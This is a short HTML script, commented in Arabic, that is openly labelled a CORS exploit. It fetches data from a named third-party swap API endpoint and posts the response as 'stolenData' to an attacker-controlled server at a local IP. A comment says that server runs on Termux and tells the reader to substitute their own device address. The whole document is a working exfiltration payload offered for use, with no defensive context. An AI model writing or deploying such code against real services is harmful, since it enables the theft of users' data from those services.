<script>
    function exploitCORS() {
        const targetUrl = "https://swap-api.zetrix.com/some/endpoint"; // رابط الـ API المستهدف
        fetch(targetUrl, {
            method: "GET",
            headers: {
                'X-Custom-Header': 'SomeValue'
            }
        })
        .then(response => response.text())
        .then(data => {
            // إرسال البيانات المسروقة إلى الخادم الذي يعمل على Termux
            console.log("Data received:", data);
            fetch('http://10.2.0.2:3000/stealData', { // استبدل <YOUR_TERMUX_IP> بعنوان جهازك
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ stolenData: data })
            });
        })
        .catch(error => {
            console.error('Error:', error);
        });
    }
</script>
